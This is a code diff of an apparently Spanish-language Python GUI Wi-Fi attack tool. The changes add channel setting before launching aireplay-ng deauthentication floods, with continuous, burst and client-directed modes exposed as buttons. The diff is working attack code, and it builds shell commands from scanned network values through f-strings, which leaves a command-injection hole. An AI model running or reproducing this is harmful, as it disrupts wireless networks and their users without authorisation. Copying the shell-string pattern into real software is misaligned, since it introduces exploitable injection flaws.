@@ -954,7 +954,11 @@ no-resolv
             )
             time.sleep(1)
 
-            # Iniciar desautenticación
+            # Fijar canal antes de desautenticar
+            subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']],
+                        stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+
+            # Iniciar desautenticación continua
             deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
             if deauth_mode == "directed" and cliente_mac:
                 deauth_cmd.extend(["-c", cliente_mac])
@@ -1124,6 +1128,8 @@ no-resolv
     def _deauth_ejecutar(self, cliente):
         red = self.wifi_state["target"]
         mon = self.wifi_state["mon_iface"]
+        # Ajustar canal antes de desautenticar
+        self.ejecutar_comando(f"sudo iw dev {mon} set channel {red['ch']} 2>/dev/null")
         # Seleccionar intensidad
         self.limpiar_main_frame()
         self.agregar_boton_atras(self._wifi_deauth)
@@ -1131,9 +1137,9 @@ no-resolv
         opciones = [("Continuo (0)", "0"), ("1 ráfaga (5)", "5"), ("3 ráfagas (15)", "15")]
         for texto, count in opciones:
             ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO,
-                         command=lambda c=count: self.ejecutar_comando(
-                             f"sudo aireplay-ng --deauth {c} -a {red['bssid']} -c {cliente} {mon}"
-                         )).pack(fill="x", padx=40, pady=5)
+                        command=lambda c=count: self.ejecutar_comando(
+                            f"sudo aireplay-ng --deauth {c} -a {red['bssid']} -c {cliente} {mon}"
+                        )).pack(fill="x", padx=40, pady=5)
         self.mostrar_consola()
 
     def _wifi_explorar_handshakes(self):
